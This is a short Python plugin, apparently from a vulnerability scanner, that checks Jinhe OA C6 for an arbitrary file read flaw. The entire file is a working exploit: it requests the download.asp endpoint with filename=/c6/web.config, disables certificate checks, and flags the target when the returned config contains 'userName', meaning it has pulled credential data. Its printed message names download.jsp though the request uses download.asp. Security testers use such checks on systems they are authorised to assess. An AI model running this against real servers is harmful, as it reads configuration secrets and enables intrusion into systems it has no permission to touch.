import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging

def 金和oa_任意文件读取(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    exp_url = urldata + "C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config"
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=exp_url, headers=headers, verify=False)
        if response.status_code == 200 and 'userName' in response.text:
            print(Vcolors.RED + "[+] 金和OA C6 download.jsp 任意文件读取漏洞:{}".format(exp_url)+Vcolors.ENDC)

        else:
            print(Vcolors.WARNING + "[x] 金和OA C6 download.jsp 任意文件读取漏洞不存在" +Vcolors.ENDC)
    except:
        logging.error("金和oa_任意文件读取脚本出现异常")
